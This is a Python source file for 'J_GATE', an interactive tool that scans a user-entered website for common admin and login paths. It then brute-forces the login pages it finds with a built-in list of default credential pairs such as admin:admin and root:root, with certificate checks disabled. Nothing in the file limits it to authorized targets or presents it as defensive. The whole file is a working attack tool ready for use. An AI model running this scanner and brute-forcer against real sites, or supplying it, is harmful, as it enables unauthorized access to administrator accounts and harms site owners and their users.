import requests
from urllib.parse import urljoin
import sys
import time
from colorama import Fore, Style, init

init(autoreset=True)

class JGate:
    def __init__(self):
        self.base_url = None
        self.timeout = 5
        self.found_pages = []
        
        # Common paths for login and admin pages
        self.paths = [
            'login', 'admin', 'administrator', 'admin-login',
            'user/login', 'account/login', 'signin', 'sign-in',
            'wp-login', 'wp-admin', 'admin.php', 'login.php',
            'index.php?login', 'manage', 'control', 'panel',
            'cp', 'members', 'auth', 'authenticate',
            'access', 'logon', 'user', 'users',
            'backend', 'dashboard', 'cms', 'admins',
            'admin/login', 'admin/index', 'adminpanel',
            'controlpanel', 'cpanel', 'phpmyadmin',
            'login/index', 'user/admin'
        ]
        
        # Common credentials for brute force
        self.common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '12345'),
            ('admin', '123456'),
            ('admin', '1234567'),
            ('admin', 'admin123'),
            ('administrator', 'administrator'),
            ('administrator', 'password'),
            ('root', 'root'),
            ('root', 'password'),
            ('user', 'user'),
            ('user', 'password'),
            ('test', 'test'),
            ('guest', 'guest'),
        ]
    
    def display_banner(self):
        """Display the main banner"""
        banner = f"""
{Fore.CYAN}
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║                     J_GATE v1.0                          ║
║                Admin Panel Finder Tool                   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def display_menu(self):
        """Display main menu"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}[1] Find Admin Panels")
        print(f"{Fore.YELLOW}[2] Brute Force Login")
        print(f"{Fore.YELLOW}[3] Custom Credentials Test")
        print(f"{Fore.YELLOW}[4] Exit")
        print(f"{Fore.CYAN}{'='*60}")
        
        while True:
            choice = input(f"\n{Fore.CYAN}[?] Select option (1-4): {Fore.WHITE}").strip()
            if choice in ['1', '2', '3', '4']:
                return choice
            print(f"{Fore.RED}[!] Invalid option, please try again")
    
    def check_url(self, path):
        """Check a specific URL"""
        url = urljoin(self.base_url, path)
        try:
            response = requests.get(url, timeout=self.timeout, allow_redirects=False, verify=False)
            
            # Status codes indicating found pages
            if response.status_code in [200, 301, 302, 303, 307, 401, 403]:
                return True, response.status_code, url
            return False, response.status_code, url
        except requests.exceptions.RequestException:
            return False, 0, url
    
    def search_admin_panels(self):
        """Search for login pages"""
        print(f"{Fore.YELLOW}{'='*60}")
        print(f"{Fore.CYAN}[*] Target: {self.base_url}")
        print(f"{Fore.CYAN}[*] Scanning {len(self.paths)} paths...")
        print(f"{Fore.YELLOW}{'='*60}\n")
        
        for i, path in enumerate(self.paths, 1):
            found, status, url = self.check_url(path)
            
            # Display progress
            progress = f"[{i}/{len(self.paths)}]"
            
            if found:
                print(f"{Fore.GREEN}{progress} [+] FOUND: {path}")
                print(f"{Fore.GREEN}    └─ URL: {url}")
                print(f"{Fore.GREEN}    └─ Status: {status}\n")
                self.found_pages.append((path, url, status))
            else:
                print(f"{Fore.LIGHTBLACK_EX}{progress} [-] {path}")
        
        self.print_results()
    
    def attempt_login(self, url, username, password):
        """Attempt to login with given credentials"""
        try:
            # Try POST request
            payload = {
                'username': username,
                'user': username,
                'login': username,
                'email': username,
                'password': password,
                'pass': password
            }
            
            response = requests.post(
                url,
                data=payload,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            
            # Check for success indicators
            if response.status_code == 200:
                # Check for common success/failure indicators
                content_lower = response.text.lower()
                
                if any(word in content_lower for word in ['dashboard', 'welcome', 'logged in', 'success', 'redirect']):
                    return True
                
                if any(word in content_lower for word in ['invalid', 'incorrect', 'failed', 'error']):
                    return False
            
            elif response.status_code in [301, 302, 303, 307]:
                # Redirect usually means login attempt
                return None  # Uncertain
            
            return False
        except:
            return False
    
    def brute_force_login(self):
        """Brute force login attempt"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"{Fore.CYAN}[*] Target: {self.base_url}")
        
        # Get login URL
        if not self.found_pages:
            print(f"{Fore.RED}[!] No login pages found. Run 'Find Admin Panels' first")
            print(f"{Fore.YELLOW}{'='*60}\n")
            return
        
        print(f"{Fore.CYAN}[*] Found login pages:")
        for i, (path, url, status) in enumerate(self.found_pages, 1):
            print(f"    [{i}] {url}")
        
        while True:
            try:
                choice = input(f"\n{Fore.CYAN}[?] Select login URL (number): {Fore.WHITE}").strip()
                login_url = self.found_pages[int(choice)-1][1]
                break
            except:
                print(f"{Fore.RED}[!] Invalid selection")
        
        print(f"\n{Fore.CYAN}[*] Testing {len(self.common_credentials)} credentials...")
        print(f"{Fore.YELLOW}{'='*60}\n")
        
        found_creds = []
        
        for i, (username, password) in enumerate(self.common_credentials, 1):
            print(f"[{i}/{len(self.common_credentials)}] Testing: {username}:{password}", end=" ... ")
            
            result = self.attempt_login(login_url, username, password)
            
            if result:
                print(f"{Fore.GREEN}[+] POSSIBLE MATCH")
                found_creds.append((username, password))
            elif result is None:
                print(f"{Fore.YELLOW}[?] UNCERTAIN")
            else:
                print(f"{Fore.LIGHTBLACK_EX}[-] FAILED")
        
        print(f"\n{Fore.YELLOW}{'='*60}")
        if found_creds:
            print(f"{Fore.GREEN}[+] Possible credentials found:")
            for username, password in found_creds:
                print(f"{Fore.GREEN}    {username}:{password}")
        else:
            print(f"{Fore.RED}[!] No credentials found")
        print(f"{Fore.YELLOW}{'='*60}\n")
    
    def custom_credentials_test(self):
        """Test custom username and password"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"{Fore.CYAN}[*] Target: {self.base_url}")
        
        if not self.found_pages:
            print(f"{Fore.RED}[!] No login pages found. Run 'Find Admin Panels' first")
            print(f"{Fore.YELLOW}{'='*60}\n")
            return
        
        print(f"{Fore.CYAN}[*] Found login pages:")
        for i, (path, url, status) in enumerate(self.found_pages, 1):
            print(f"    [{i}] {url}")
        
        while True:
            try:
                choice = input(f"\n{Fore.CYAN}[?] Select login URL (number): {Fore.WHITE}").strip()
                login_url = self.found_pages[int(choice)-1][1]
                break
            except:
                print(f"{Fore.RED}[!] Invalid selection")
        
        username = input(f"{Fore.CYAN}[?] Enter username: {Fore.WHITE}").strip()
        password = input(f"{Fore.CYAN}[?] Enter password: {Fore.WHITE}").strip()
        
        if not username or not password:
            print(f"{Fore.RED}[!] Username and password cannot be empty")
            return
        
        print(f"\n{Fore.CYAN}[*] Testing credentials: {username}:{password}")
        print(f"{Fore.YELLOW}{'='*60}\n")
        
        result = self.attempt_login(login_url, username, password)
        
        if result:
            print(f"{Fore.GREEN}[+] Login might be successful!")
        elif result is None:
            print(f"{Fore.YELLOW}[?] Uncertain - possible redirect detected")
        else:
            print(f"{Fore.RED}[-] Login failed")
        
        print(f"{Fore.YELLOW}{'='*60}\n")
    
    def print_results(self):
        """Print the final results"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        
        if not self.found_pages:
            print(f"{Fore.RED}[!] No admin/login pages found")
            print(f"{Fore.YELLOW}{'='*60}\n")
            return
        
        print(f"{Fore.GREEN}[+] SCAN COMPLETE - Found {len(self.found_pages)} page(s)")
        print(f"{Fore.YELLOW}{'='*60}\n")
        
        print(f"{Fore.CYAN}Results:")
        print(f"{Fore.YELLOW}{'-'*60}\n")
        
        for i, (path, url, status) in enumerate(self.found_pages, 1):
            print(f"{Fore.GREEN}[{i}] Path: {path}")
            print(f"    URL: {url}")
            print(f"    Status Code: {status}\n")
        
        print(f"{Fore.YELLOW}{'='*60}\n")
    
    def get_target(self):
        """Get target website from user"""
        while True:
            print(f"{Fore.CYAN}[?] Enter target website (e.g., example.com): ", end="")
            target = input(f"{Fore.WHITE}").strip()
            
            if not target:
                print(f"{Fore.RED}[!] Error: Please enter a valid website\n")
                continue
            
            # Validate and format the URL
            if not target.startswith(('http://', 'https://')):
                target = f'http://{target}'
            
            self.base_url = target
            return target
    
    def run(self):
        """Main execution"""
        try:
            self.display_banner()
            self.get_target()
            
            while True:
                choice = self.display_menu()
                
                if choice == '1':
                    self.found_pages = []
                    self.search_admin_panels()
                
                elif choice == '2':
                    self.brute_force_login()
                
                elif choice == '3':
                    self.custom_credentials_test()
                
                elif choice == '4':
                    print(f"\n{Fore.GREEN}[+] Thank you for using J_GATE")
                    print(f"{Fore.YELLOW}{'='*60}\n")
                    sys.exit(0)
        
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}[!] Interrupted by user")
            print(f"{Fore.YELLOW}{'='*60}\n")
            sys.exit(0)

def main():
    requests.packages.urllib3.disable_warnings()
    j_gate = JGate()
    j_gate.run()

if __name__ == "__main__":
    main()
